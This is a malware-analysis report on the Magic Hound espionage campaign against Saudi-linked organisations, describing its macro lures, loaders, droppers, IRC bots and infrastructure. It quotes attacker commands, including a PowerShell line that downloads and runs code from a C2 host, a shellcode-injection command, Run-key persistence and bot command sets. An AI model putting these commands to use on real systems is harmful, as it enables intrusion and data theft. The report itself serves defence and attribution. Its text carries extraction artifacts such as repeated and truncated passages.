This appears to be an attack**\n**campaign focused on espionage. Based upon our visibility it has primarily targeted organizations in**\n**the energy, government, and technology sectors that are either based or have business interests in**\n**Saudi Arabia. The adversaries appear to have evolved their tactics and techniques throughout the**\n**tracked time-period, iterating through a diverse toolset across different waves of attacks. Link�**\n**analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and**\n**[the adversary group called “Rocket](http://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf)** **[Kitten” (AKA Operation Saffron Rose, Ajax Security Team,�](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-the-spy-kittens-are-back.pdf)**\n**Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters. Artifacts of this�**\n**[campaign was also recently published by Secureworks CTU.](https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations)**\n\n**We were able to collect over fifty samples of the tools used by the Magic Hound campaign using the�**\n**[AutoFocus threat intelligence tool. The earliest malware sample we were able to collect had a](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/autofocus)**\n**compile timestamp in May 2016. The samples themselves ranged from IRC bots, an open source**\n**Python remote access tool, malicious macros, and others. It is believed the use of specific tools may�**\n**have coincided with specific attack waves by this adversary, with the most recent attacks using�**\n**weaponized Microsoft Office documents with malicious macros. Due to the large amount of data�**\n**collected, and limitations on attack telemetry, this blog will focus primarily on the most recent**\n**attacks occurring in the latter half of 2016.**\n\n## ATTACK DETAILS\n\n**The samples initially collected and associated with Magic Hound were Microsoft Word and Excel**\n**documents containing embedded malicious macros. We were able to expand our data set by**\n**pivoting on infrastructure and tool behavior, which uncovered additional types of tools in use by**\n**Magic Hound, such as regular portable executable (PE) payloads, PE files compiled in .NET�**\n**Framework, various forms of IRC bots, and an open source file-less Python remote access tool�**\n**[called Pupy.](https://github.com/n1nj4sec/pupy)**\n\n**The weaponized Office documents were found to be hosted either on what appeared to be�**\n**compromised legitimate websites, or on websites using domain names similar to legitimate domain**\n**names in appearance. The two legitimate websites we were able to identify were owned by**\n**organizations in the government and energy sectors. Based on the existence of these malicious files�**\n\n\n-----\n\n**two other delivery sites were ntg-sa[.]com, which may be trying to spoof a Saudi based information**\n**and communication technology conglomerate and mol.com-ho[.]me, which may be trying to spoof**\n**the Ministry of Labor. A third delivery site was identified at its.com-ho[.]me which may appear to be a�**\n**benign domain.**\n\n**Several of these documents were also found on a seemingly unrelated, but benign-looking domain,**\n**briefl[.]ink.�**\n\n**It is highly likely the adversary then used spear-phishing attacks containing links to these malicious**\n**documents as a delivery mechanism. We were ultimately able to identify multiple organizations in the**\n**government, energy, and technology sectors targeted by Magic Hound.**\n\n**The weaponized documents themselves all contained malicious macros which were designed to call**\n**Windows PowerShell to retrieve additional tools. A handful of lures with different themes were used�**\n**repeatedly with variations throughout the eighteen collected documents. They ranged from**\n**documents masquerading as official Saudi government forms to a holiday greetings card. The forms�**\n**masquerading as official government documents specifically used imagery from the Ministry of�**\n**Health and the Ministry of Commerce claiming to be mandatory forms that required macros to be**\n**enabled. Examples of the documents can be seen below:**\n\n\n-----\n\n-----\n\n## INFRASTRUCTURE\n\n**Analysis of the weaponized documents revealed some peculiarities right away. The majority of**\n**documents used the name “gerry knight” for the author field in the document metadata, and the�**\n**embedded macros largely used direct IP connections to command and control (C2) servers rather**\n**than using domain names. These C2 servers also appeared to lack any relationships to each other**\n**and were hosted on a variety of VPS providers. Two of the Word documents using the “gerry knight”**\n**author name however were found to be communicating to C2 servers on two specific domains,�**\n**www1.chrome-up[.]date and www3.chrome-up[.]date. Using these domains as pivot points, we were**\n**able to expand our data set. As seen below, the relational analysis proved to be quite fruitful:**\n\n\n-----\n\n**_Figure 1 Overview of relationships_**\n\n**We rapidly discovered a different set of tools communicating to the exact same C2 servers as those�**\n**two Word documents, in addition to other tools communicating to other subdomain variations of**\n**chrome-up[.]date as seen in the following graphic:**\n\n\n-----\n\n**_Figure 2 Command and control overlaps_**\n\n**From there, we were able to map out a large infrastructure separating out into four categories of**\n**tools: downloaders, droppers, loaders, and payloads. What initially appeared as a disparate and**\n**segregated attack campaign appeared very rapidly to be a persistent and prolonged attack**\n**campaign with very specific goals in mind.�**\n\n**In total, we were able to collect over fifty different samples via infrastructure reuse, behavioral�**\n**matching, and the reuse of a specific file for maintaining persistence. These tools included Microsoft�**\n**Office documents, portable executables (PE), .NET Framework PE files, Meterpreter, IRC bots, an�**\n**open sourced Meterpreter module called Magic Unicorn, and an open sourced Python RAT called**\n**Pupy.**\n\n**Interestingly as we continued to expand and pivot in our data set, one of the C2 IPs used by an IRC**\n**bot payload from Magic Hound was found to be the same IP used to deliver a different IRC bot�**\n**called MPK.**\n\n\n-----\n\n**_Figure 3 Rocket Kitten and Magic Hound infrastructure overlap_**\n\n**The MPK bot is not publicly available and had previously been attributed to an adversary group**\n**called “Rocket Kitten” which has often been thought to be a state sponsored adversary operating in**\n**the Middle East region. Although the likelihood of two different adversaries focused on espionage�**\n**operating in the same geographical region using one specific IP and not being related somehow is�**\n**fairly slim, due to limited telemetry, we lack additional corroborating evidence of a conclusive**\n**relationship.**\n\n## MAGIC HOUND TOOLSET\n\n**The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead**\n**relying on executables and Microsoft Office documents, specifically Excel and Word documents�**\n**containing malicious macros. During our analysis, we were able to determine the ultimate payload for**\n**several of these attacks. One payload was a Python based open source remote administration tool**\n**(RAT) called Pupy. A second payload was an IRC bot we have named MagicHound.Leash. We have**\n**[also seen this group use the Magic Unicorn module to generate a PowerShell script to deliver a](https://github.com/trustedsec/unicorn)**\n**shellcode-based payload. While we have not been able to obtain a secondary payload from the**\n**Unicorn generated PowerShell script, we believe that this group uses the script to deliver**\n**Metasploit’s Meterpreter as a potential payload as well.**\n\n**We have categorized the custom tools in use by the Magic Hound campaign into five categories, with�**\n**corresponding names in Table 1. Additional details for these tools may be found in the appendix.**\n\n**TYPE** **NAME**\n\n**Dropper** **MagicHound.DropIt**\n\n**Executable Loader** **MagicHound.Fetch**\n\n**Document Loader** **MagicHound.Rollover**\n\n**Downloader** **MagicHound.Retriever**\n\n**IRC Bot** **MagicHound Leash**\n\n|TYPE|NAME|\n|---|---|\n|Dropper|MagicHound.DropIt|\n|Executable Loader|MagicHound.Fetch|\n|Document Loader|MagicHound.Rollover|\n|Downloader|MagicHound.Retriever|\n\n\n-----\n\n## MAGICHOUND.ROLLOVER\n\n**The Magic Hound campaign used Word and Excel documents containing malicious macros as a**\n**delivery method, specifically attempting to load either the Pupy RAT or meterpreter which we have�**\n**called MagicHound.Rollover. The malicious macros were all designed to use Windows PowerShell to**\n**download a shellcode-based payload from a remote server. We discovered two different techniques�**\n**used in the PowerShell scripts, the first being a straightforward execute command of a string�**\n**retrieved from the remote server. The second technique appeared to be from a tool called Magic**\n**Unicorn, an open source module for meterpreter. Specifically, we discovered code in the PowerShell�**\n**script that was a match for code in Magic Unicorn containing the comment “one line shellcode**\n**injection with native x86 shellcode”.**\n\n## MAGICHOUND.FETCH\n\n**In addition to loading payloads using macros within delivery documents, we observed the Magic**\n**Hound campaign using executables to load secondary payloads from a remote server. Both a**\n**custom developed loader, which we have named MagicHound.Fetch, as well as the default loader**\n**that comes with Pupy were found to be in use. The Fetch loader allowed us to use attributes within**\n**the loader to uncover more tools used by this group, which included a backdoor and an IRC bot.**\n\n**Fetch first attempts to create persistent access to the targeted host then retrieve a secondary�**\n**payload from a remote server. To set up persistence, the loader writes a file to “c:\\temp\\rr.exe” and�**\n**executes it with specific command line arguments to create auto run registry keys. All Fetch samples�**\n**drop the same exact executable to set up persistence.**\n\n**Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting**\n**their embedded strings using AES. However, they all used the same key “agkrhfpdbvhdhrkj”. The**\n**loader’s main goal was to run a PowerShell command to execute shellcode. We found the**\n**[PowerShell command used by Fetch within the source code of Magic Unicorn, which was also used](https://github.com/trustedsec/unicorn/blob/master/unicorn.py)**\n**in the Magic Hound delivery documents. The shellcode executed by this PowerShell is the exact**\n**same as in the delivery documents, using code from Metasploit which can obtain additional**\n**shellcode to execute using an HTTP request to the following URL:**\n\n**http://www7.chrome-up[.]date/0m5EE**\n\n**We were not able to retrieve the shellcode hosted at this URL. However, as alluded to above, we**\n**believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based**\n**payload which is likely to be meterpreter.**\n\n## PUPY LOADER\n\n**The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms**\n**such as Windows, macOS, Linux and Android. We have seen the Magic Hound campaign use both**\n**the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems. Analysis of their**\n**configurations show that the C2 servers used both fully-qualified domain names and IP addresses.�**\n**Also, the configurations show the use of the “obfs3” (The Threebfuscator) transport, which is an�**\n**obfuscation method to hide the true TCP-based communications protocol. The “obfs3” is used in the**\n**[Tor project and the specifics of this transport can be found at �the Tor Project.](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt)**\n\n## MAGICHOUND.DROPIT\n\n\n-----\n\n**named MagicHound.DropIt. The DropIt Trojan we analyzed is an executable that builds another**\n**executable by decoding embedded blobs of base64 encoded data and concatenating them together**\n**in the correct order. In all of the DropIt samples we collected, the dropper then saves the executable**\n**to the user’s %TEMP% folder and executes the file.�**\n\n**We have also seen Magic Hound using DropIt as a binder, specifically dropping a legitimate decoy�**\n**executable along with the malicious executable onto the target host. The legitimate decoy**\n**executable and the malicious executable are then both executed, but with the malicious file running�**\n**in the background and the decoy presented to the user. These types of tactics are generally used for**\n**evasion and to not trigger and suspicion from the victim. In one example, the decoy executable was**\n**a legitimate Flash installer, therefore from the victim’s perspective, they would experience the**\n**expected behavior of a Flash installer.**\n\n## MAGICHOUND.RETRIEVER\n\n**We observed a DropIt sample installing another Trojan we call MagicHound.Retriever. At a high level,**\n**Retriever is a .NET downloader that retrieves secondary payloads using an embedded URL in its**\n**configuration as the C2. Retriever uses .NET web services and the SoapHttpClientProtocol class to�**\n**communicate with its C2 server, which generates HTTP requests resembling the example request in**\n**Figure 4.**\n\n**_Figure 4 Retriever HTTP request sent to its C2 server_**\n\n## MAGICHOUND.LEASH\n\n**The Magic Hound campaign was also discovered deploying an IRC Bot, which we have named**\n**MagicHound.Leash. We discovered this connection when we observed a DropIt sample installing a**\n**backdoor Trojan that used IRC for its C2 communications.**\n\n**Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must**\n**also be connected to the IRC server. All of its available commands (see Appendix), except for the**\n**VER command seen in Figure 5, must be issued by individuals in the IRC channel with nicknames**\n**that start with “AS_” or “AF_”.**\n\n\n-----\n\n**_Figure 5 Lecash bot responding to VER command_**\n\n**There are a great deal of similarities between the IRC bot originally discussed in iSight’s**\n**NEWSCASTER whitepaper and LEASH. iSight’s whitepaper provided details on an IRC bot, which**\n**some refer to as Parastoo based on the password used to join the IRC channel, as seen in the**\n**following network traffic generated when attempting to connect to the C2:�**\n\n**Parastoo Trojan** **MagicHound.Leash**\n\n**USER AS_ # # :des** **USER AS_a # # :des**\n\n**NICK t__982** **NICK Conroy**\n\n**JOIN :#tistani Parastoo** **JOIN :#kalk**\n\n**Performing a binary diff revealed a 67% similarity between the Leash and Parastoo samples. In�**\n**addition to sharing significant portions of code, both of the IRC bots require an IRC user’s nickname�**\n**to start with either “AF_” or “AS_” to run commands on the system. Also, the two bots have similar**\n**responses to “VER” commands seen in Figure 6 below, which differ slightly from the responses seen�**\n**generated by Leash.**\n\n**_Figure 6 Parastoo Trojan responding to commands in similar manner to Leash_**\n\n|Parastoo Trojan|MagicHound.Leash|\n|---|---|\n|USER AS_ # # :des NICK t__982 JOIN :#tistani Parastoo|USER AS_a # # :des NICK Conroy JOIN :#kalk|\n\n\n-----\n\n**We also found a second IRC bot called MPK using the same IP for its C2 server that a Leash sample**\n**was hosted on. This MPK IRC bot is very similar to the MPK Trojan that used a custom C2**\n**communications protocol, as detailed in a whitepaper by CheckPoint regarding a threat group called**\n**[Rocket Kitten. We believe this version of the MPK Trojan is based on the same code base, as both](http://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf)**\n**the IRC version and the one referenced in the white paper have considerable similarities from a**\n**behavior standpoint as well as direct code overlap.**\n\n## CONCLUSION\n\n**The Magic Hound attack campaign is an active and persistent espionage motivated adversary**\n**operating in the Middle East region. Organizations in the government, energy, and technology**\n**sectors have been targeted by this adversary, specifically organizations based in or doing business�**\n**in Saudi Arabia. The toolset used by the Magic Hound campaign was an assortment of custom tools,**\n**as well as open sourced tools available to the general public. None of the tools we uncovered were**\n**found to be exploit-driven, and relied exclusively on social engineering tactics to compromise**\n**targets. While we did discover a potential relationship with the Rocket Kitten adversary group, we**\n**cannot confirm the extent of that relationship at this time, although we will continue to monitor the�**\n**activities of Magic Hound.**\n\n**Palo Alto Networks customers are protected via the following:**\n\n**WildFire identification and detection of malicious samples�**\n**Command and control

to load either the Pupy RAT or possibly**\n**Meterpreter. We call this tool MagicHound.Rollover. In one example, the Word document contained a**\n**button with the label “First click “Enable Content” above the page, then click here to fill out the form”�**\n\n**This string attempts to trick the user into enabling macros to execute the malicious code within the**\n**macro. When the macro executes, it unhides a table that contains the contents of a legitimate**\n**document in an attempt to make the user less suspicious of the malicious activities occurring in the**\n**background. The macro contains malicious code that attempts to download content from a remote**\n**server.**\n\n**The macro uses PowerShell to download a shellcode-based payload from a remote server using one**\n**of two available techniques. The first technique is rather straightforward, using PowerShell’s “iex”�**\n**function to execute a string obtained from a remote server. The macro carries out this first technique�**\n**by running the following command:**\n\n\n**1** **powershell.exe -w** **hidden -noni -nop -c** **\"iex(New-Object System.Net.WebClient).DownloadString('hxxp**\n\n\n**The code above generates the following HTTP request, which the C2 server would then respond to**\n**with a script that PowerShell would execute:**\n\n**GET /eiloShaegae1 HTTP/1.1**\n**Host: 139.59.46[.]154:3485**\n**Connection: Keep-Alive**\n\n**The second method involves using PowerShell to create a thread to execute a buffer of shellcode,�**\n**[which we believe the threat actors obtained from the Magic Unicorn source code. The Unicorn](https://github.com/trustedsec/unicorn)**\n**source code contains a comment for this specific PowerShell command, which is described as a�**\n**“one line shellcode injection with native x86 shellcode”.**\n\n**The shellcode begins with a stub that is responsible for decrypting additional shellcode. To decrypt**\n**the additional shellcode, the stub code will start with an initial key, such as 0x6CAF9362 and XOR**\n**the first DWORD of the additional shellcode. It will then add the resulting DWORD to the key that the�**\n**stub code will use to decrypt the second DWORD and so on. After we decrypted the additional**\n**shellcode, we determined that the functional shellcode is part of the Metasploit Framework,**\n**specifically using the block api.asm code to resolve API function names and the�**\n\n\n-----\n\n**https://github.com/rapid7/metasploit-**\n**framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm**\n\n**https://github.com/rapid7/metasploit-**\n**framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm**\n\n**The purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to**\n**the URL “hxxp://45.76.128[.]165:4443/0w0O6”. We are unsure of the shellcode hosted at this URL,**\n**but it is possible that additional shellcode-based payloads like Meterpreter could have been served**\n**by this shellcode.**\n\n**Two Rollover delivery documents (SHA256:**\n**6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b and SHA256:**\n**218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2) attempted to**\n**communicate with the URL hxxp://139.59.46[.]154:3485/eiloShaegae1 to obtain additional code to**\n**execute.

The C2 server will respond to this HTTP GET request**\n**with a large amount of data that includes a PowerShell script that also contains a DLL payload that is**\n**embedded as a series of base64 encoded chunks, that is then decoded using the following code:**\n\n**1** **$PEBytesTotal = [System.Convert]::FromBase64String($PEBytes0+$PEBytes1+$PEBytes2+$PEBytes3+$PEByte**\n\n**The PowerShell script loads the DLL payload directly into memory without saving it to the disk. The**\n**Pupy payload was generated using the following configuration, which shows the C2 IP/port and the�**\n**use of the “obfs3” transport:**\n\n\n**1** **LAUNCHER_ARGS=['--host',** **'139.59.46[.]154:3543',** **'-t',** **'obfs3']**\n\n\n**It appears the adversary used a majority of the following Pupy module to create the PowerShell**\n\n\n-----\n\n**[https://github.com/n1nj4sec/Pupy/blob/master/Pupy/Pupylib/payloads/ps1_oneliner.py](https://github.com/n1nj4sec/pupy/blob/master/pupy/pupylib/payloads/ps1_oneliner.py)**\n\n## MAGICHOUND.FETCH\n\n**The custom loader Trojan used by this group, which we call MagicHound.Fetch is responsible for**\n**setting up persistent access to the system and to reach out to a remote server to download and**\n**execute a secondary payload. To set up persistence, the loader creates a folder named “c:\\temp”,**\n**sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer.**\n**It then writes a file named “rr.exe” (SHA256:�**\n**f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and**\n**executes it with specific command line arguments. During our analysis, we observed one loader�**\n**running “rr.exe” with the following arguments:**\n\n**1** **open cmd.exe /c** **c:\\\\temp\\\\rr.exe SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run** **\"C:\\DOCUME~1\\AD**\n\n**The “rr.exe” payload dropped to the system does nothing more than use the supplied command line**\n**arguments to create a registry key to execute the payload each time the system starts. In the**\n**example above, the “spp.exe” executable would be added to an auto-run registry key at:**\n\n**SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplore**\n\n**Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded**\n**strings with AES using the same key “agkrhfpdbvhdhrkj”; however, the loader’s main goal involved**\n**running the following command:**\n\n**1** **/c** **powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEA**\n\n**The base64 encoded command decodes to the following:**\n\n\n**1** **$0o8e = '$f9B = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAd**\n\n\n**The decoded command above builds a buffer that it uses to store shellcode and creates a thread to�**\n**[execute it. We found the command above within the source code of Magic Unicorn, which was also](https://github.com/trustedsec/unicorn/blob/master/unicorn.py)**\n**used in the Magic Hound delivery documents. The shellcode executed by this command is the same**\n**as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode�**\n**to execute using an HTTP request to the following URL:**\n\n**http://www7.chrome-up[.]date/0m5EE**\n\n**We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to**\n**provide a payload. However, as alluded to above, we believe that this adversary used the open**\n**source Magic Unicorn tool to load a shellcode-based payload. The fact that the actor used**\n**Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the**\n**ultimate payload of this attack is Meterpreter, which is a shellcode-based payload.**\n\n## PUPY LOADER\n\n**Pupy comes with default loaders that run the RAT on a variety of different platforms, specifically�**\n**Windows, OSX, Linux and We have seen the Magic Hound actors using both the 32-bit and 64-bit**\n**DLL loaders that come with Pupy to infect Windows systems. We have gathered three samples of the**\n**default loader associated with this group and extracted the following configurations:�**\n\n|SHA256 of Sample|Configuration�|\n|---|---|\n\n\n-----\n\n|82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190�|�LAUNCHER_ARGS= [‘–host’, ‘www1.chrome- up[.]date:4443’, ‘-t’, ‘obfs3’]|\n|---|---|\n|db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f|LAUNCHER_ARGS= [‘–host’, ‘www1.chrome- up[.]date:4443’, ‘-t’, ‘obfs3’]|\n|7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73|LAUNCHER_ARGS= [‘–host’, ‘139.59.46[.]154:3543’, ‘-t’, ‘obfs3’]|\n\n\n**These configurations show that this group uses both fully-qualified domain names and IP addresses�**\n**to host their Pupy C2 servers. Also, the configurations show the use of the “obfs3” (The�**\n**Threebfuscator) transport, which is an obfuscation method to hide the true TCP-based**\n**communications protocol. The “obfs3” is used in the Tor project and the specifics of this transport�**\n**[can be found at the Tor Project.](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt)**\n\n## MAGICHOUND.DROPIT\n\n**The Magic Hound campaign was also discovered using a custom dropper tool, which we have**\n**named MagicHound.DropIt.**\n\n**The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding**\n**embedded blobs of base64 encoded data and concatenating them together in the correct order. In**\n**all of the DropIt samples we collected, the dropper will then save the executable to the user’s**\n**%TEMP% folder and execute the file, specifically to one of the following filenames:�**\n\n**%TEMP%\\spp.exe**\n**%TEMP%\\sloo.exe**\n**%TEMP%\\spoo.exe**\n**%TEMP%\\vschos.exe**\n\n**We have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate�**\n**decoy executable along with the malicious executable as a payload. For example, we analyzed a**\n**DropIt sample (SHA256:**\n**cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two**\n**executables, one of which was saved to “%TEMP%\\flash_update.exe” that was a legitimate Flash�**\n**Player installer. We believe the Magic Hound campaign uses the DropIt Trojan to run legitimate**\n**applications that fit their social engineering, which in the example above included coercing the victim�**\n**into updating their Flash Player.**\n\n## MAGICHOUND.RETRIEVER\n\n**We observed a DropIt sample installing another Trojan we call MagicHound.Retriever. At a high level,**\n**Retriever is a .NET downloader that downloads secondary payloads from servers associated with**\n**M** **i** **H** **d Whil** **th** **T j** **it** **lf d** **t** **bl** **th** **th** **M** **i** **H** **d t** **l** **it d** **t**\n\n\n-----\n\n**previously discussed. The folder name is quite generic and by itself is not a great correlation point,**\n**however, this coupled with the shared infrastructure makes a higher fidelity connection between the�**\n**two.**\n\n**The Retriever Trojan uses the following namespace:**\n\n**using pcchekapp.grp.ammar.samaneh;**\n\n**Android.The malware begins by creating a web service object and uses the following URL within its**\n**configuration:�**\n\n**http:// service.chrome-up[.]date:8080 /WebService.asmx**\n\n**It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC**\n**address and hostname. A password variable is available but unused in this sample. The code will**\n**gather some information about the system, specifically the local IP address, MAC address, and the�**\n**external IP address of the system. The code obtains the external IP address via an HTTP request**\n**using to “http://checkip.dyndns.org/” and uses a regular expression to locate an IP address from the**\n**HTTP response.**\n\n**Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate**\n**with its C2 server, which issues an HTTP POST requests that appears as:**\n\n**As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into**\n**an HTTP POST request. All subsequent interaction with the C2 server uses the same SOAP web**\n**service, so we will not show all of the generated HTTP requests. Instead, we will refer to the specific�**\n**SOAP action (see “SOAPAction” field in previous example, specifically “SetLog2”) that the Trojan�**\n**requests from the C2 server and the response from the C2 server. After sending the C2 the system**\n**information, the malware then issues a second request for “GetHasAnything”, which will**\n**communicate with the C2 server and ask the server if it has a secondary binary for the Trojan to**\n**install.**\n\n**If the C2 server provides any response to the “GetHasAnything” request, it then calls the**\n**“GetIdAbOne” SOAP method to obtain what we believe is a unique identifier for the system that the�**\n**Trojan will use for further interaction with the C2. After receiving this variable, the Trojan calls the**\n**“GetNameAbById” to obtain a base64 string that will be the filename written in a newly created�**\n**“c:\\temp” (decoded from “YzpcdGVtcFw=”) folder. The Trojan will then call “GetAbById”, which the**\n**C2 will provide a base64 string for the contents for the file to write to c:\\temp. After obtaining the�**\n**unique ID from the C2 server, the Trojan calls the “SetAbStatById” method to notify the C2 server of**\n**its status of “1” to notify the server it had successfully received the filename and file data.�**\n\n**With the file written to the system, the Trojan calls the “GetishideAbById” SOAP action to determine�**\n\n\n-----\n\n**execute the downloaded executable with elevated privileges, which would display the UAC dialog**\n**for the user to click.**\n\n**Unfortunately, we were unable to obtain a secondary payload from an active C2 server.**\n\n## MAGICHOUND.LEASH\n\n**The Magic Hound campaign was also discovered deploying an IRC Bot, which we have named**\n**MagicHound.Leash. This tool was discovered when we observed a DropIt sample installing a**\n**backdoor Trojan that used IRC for its C2 communications. The bot chooses a random name from**\n**977 hardcoded possibilities, connects to an adversary owned IRC server and joins a channel using**\n**the following IRC commands:**\n\n**USER AS_a # # :des**\n**NICK Conroy**\n**JOIN :#kalk**\n\n**Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must**\n**also be connected to the IRC server. The following commands are available:**\n\n**Command** **SubCommand** **Description**\n\n**VER** **Generates the following IRC client command that will be sent**\n**to the C2 server:**\n\n**PRIVMSG <username> :  8 LED= 20160124**\n\n**KILL** **Trojan disconnects from the IRC server and terminates itself**\n\n**RESET** **Trojan disconnects from the IRC server and runs the**\n**executable again**\n\n**OS** **Obtains the Windows version and responds to the C2 with**\n**the following message “PRIVMSG <username> :<one of the**\n**following version strings>”:**\n\n**Windows NT**\n\n**Windows 95**\n\n**Windows 98**\n\n**Windows ME**\n\n**Windows 2003**\n\n**Windows XP**\n\n**Windows 7**\n\n**Windows Vista**\n\n**Unkown os info**\n\n**!SH** **EXEC** **Not supported**\n\n|Command|SubCommand|Description|\n|---|---|---|\n|VER||Generates the following IRC client command that will be sent to the C2 server: PRIVMSG <username> : 8 LED= 20160124|\n|KILL||Trojan disconnects from the IRC server and terminates itself|\n|RESET||Trojan disconnects from the IRC server and runs the executable again|\n|OS||Obtains the Windows version and responds to the C2 with the following message “PRIVMSG <username> :<one of the following version strings>”: Windows NT Windows 95 Windows 98 Windows ME Windows 2003 Windows XP Windows 7 Windows Vista Unkown os info|\n\n\n-----\n\n**DEL** **Deletes a specified file. The Trojan will respond to the C2 with�**\n**“PRIVMSG <username> : <message> [<specified path>]”.�**\n**The message sent to the C2 will be “file is deleted.” if�**\n**successful or “file is not deleted.” if unsuccessful.�**\n\n**COPY** **Not supported.**\n\n**MOVE** **Not supported.**\n\n**REN** **Renames a specified file.

This MPK IRC bot is very similar to the MPK**\n**Trojan that used a custom C2 communications protocol, as discussed in the whitepaper by**\n**[CheckPoint discussing a threat group called Rocket Kitten. We believe this version of the MPK Trojan](http://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf)**\n**is based on the same code base, as both the IRC version and the one discussed in the above white**\n**paper have considerable similarities from a behavior standpoint and both Trojan have direct code**\n**sharing between them.**\n\n**From a behaviorial standpoint, both the IRC and custom protocol version of MPK save “tmp.vbs”**\n**and “tmp1.vbs” to the %TEMP% folder (both differed slightly but used the same variable names�**\n**within the script) in order to copy the Trojan to its final location and to execute it. Both variants need�**\n**to be executed with the command line argument “[2]” to avoid continually attempting to copy and**\n**execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files. The two variants of MPK share the�**\n**same registry key that the Trojan uses to automatically run each time the system starts, specifically:�**\n\n**[HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer**\n\n**Both MPK variants include key loggers that are extremely similar in functionality in addition to having**\n**the same strings used for headers within the key log file. The MPK IRC Bot monitors active�**\n**application windows and writes the title of the open window along with the logged keystrokes to a**\n\n\n-----\n\n**“Gmail -”**\n**“Yahoo – login”**\n**“Sign In -”**\n**“Outlook.com -“**\n\n**MPK will attempt to parse these window titles to identify the associated email address and record**\n**these to the log file using the following format:�**\n\n**/////////////**\n**Mail Find <email address>**\n**///////////**\n\n**If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the�**\n**title to the “Save.tmp” file in the following format:�**\n\n**+++++++++++++**\n**Window= <window title>**\n**+++++++++++++**\n\n**The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used.�**\n**The IRC variant creates a mutex named “mpk1” and attempts to connect to an IRC server at**\n**45.58.37[.]142:6667. The MPK bot generates a random lowercase name and uses it to log into the**\n**IRC server. It then sends the following IRC commands:**\n\n**NICK bxphzrjbxp**\n**USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp**\n\n**To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC**\n**server after the bot connects:**\n\n**Welcome to the MpkNet IRC Network**\n\n**The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to�**\n**a user with the nick “mpk”. After connecting to the IRC server, the MPK bot sends custom ping**\n**messages and provides an introduction via a “!Hello” message that contains the current logged in**\n**user of the infected host, if the user has administrator privileges, the hostname, the UUID of the**\n**system, and operating system version. Figure 7 shows the initial private messages sent from the**\n**MPK bot to the “mpk” account on the C2 server.**\n\n**_Figure 7 Initial private messages sent from MPK to the IRC C2 server_**\n\n**The commands available within the MPK IRC bot are called via a jump table, rather than a switch**\n**statement used in the custom protocol variant of MPK. The IRC variant of MPK has a command set**\n**(Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal�**\n**credentials from the targeted system via keylogging to navigate and interact with the file system to�**\n\n\n-----\n\n|run arbitrary commands, and to|download and execute additional tools on the system.|\n|---|---|\n|Command|Description|\n|!Dir|Lists the contents of a specified directory�|\n|!Drives|Enumerates the storage drives attached to the system and their respective type.|\n|!DeleteFile|Deletes a specified file�|\n|!NickChange|Changes the nickname that the Trojan uses to log into the C2 IRC server.
